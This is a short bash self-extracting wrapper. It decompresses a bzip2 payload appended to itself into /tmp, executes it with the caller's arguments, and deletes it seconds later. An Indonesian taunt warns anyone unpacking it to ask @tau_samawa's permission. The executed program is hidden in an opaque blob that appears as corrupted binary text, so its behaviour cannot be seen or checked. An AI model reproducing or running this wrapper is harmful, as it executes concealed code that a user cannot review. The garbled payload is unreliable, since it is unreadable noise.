#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��9J V��e����?�������@D@  P��]�9���O]:�%$MOhmM=	�F�I�0�4Mi���@hh��ѩ꟢�Sڦ�F���F��h �ɠ dMJ��A�4�hɈ&A�A�1J*�(�COS�i��h�22��1��� #@�L�#��0�C�@��ӄ@�������Q#	b�a�A��F�0C�-�i�H<�����[�Jd~:��>Z,���@x�T�����¢zstsn	ł�+s���Z��Z-�|�/�e��:��)�$\bkQK��@td�6f�\P,�!\����Z�5a��<�H�����c��eG).�z�_ܓh\sĒ�4�6�S�?f���]�I�J#d�VF%!	EZH�#,���#㪐�(B����.8��զt���?�՚e	ɔ:�� vdE3�5 �*�E�N��3��=x>)�%���D�/���i��Zuph�4=��]��7���+�Cz�:u*:�eDQB��1��L��H[{�P�����l�J(�w
"E��� w�
���/{�>�aY�Zp����b���Vb�e� �PPw�D�N�E(�h"\@�W��*x*�
��BD��X��H"\P�,�(4�������zgJ���ǽz������C��������'g�����A��d*x�l[j�g"�H"Y�| ��~x@���Z�l���~���0	}��ޓ�qiƪ���,��}zK8�Ӵ��������Q��)J�-�*�m�;���U{C(�^�P�7�D
�  �ʉ�$t�� �3Er�B�\�>� 5{��C�Rݻn-��r�^�V�=�66�zh��1�k"�՟2�Rcpl�,fY�PR�KYWlp�ˬ����tlz��^�K�1�E%�1��%�0�C�hiPA$/\�3���-��B�?P�Vq&e�o<�~��	Z"N�����F^�pJ��-/�ARAaY=D�Yw�2�k��p=���Ț�/���W�	�>��Fُ�|X��:�8�Ks a@` �A�����(&4K�����(_a�Yb4�P0}�̰\օ��(g%��p������}SYs�`�ˏs3)�l�Dv8&W��©h�J���aKͬ$BS�@w���yYRk�tK.]ՈO&bQ�:p�cf9y��(�w�2m�����ͷа.�����/&mr��B��>ѧj��aC;Y�k��x�
­4"4�T�I	+J���.�g�3n���Ѿ:��_�f�;z��&^���D�7��Π�>����������V�Pf�(�����DU ��TƈX�R,���(%,*I`D��� ZT��R*�ܑN$5xR�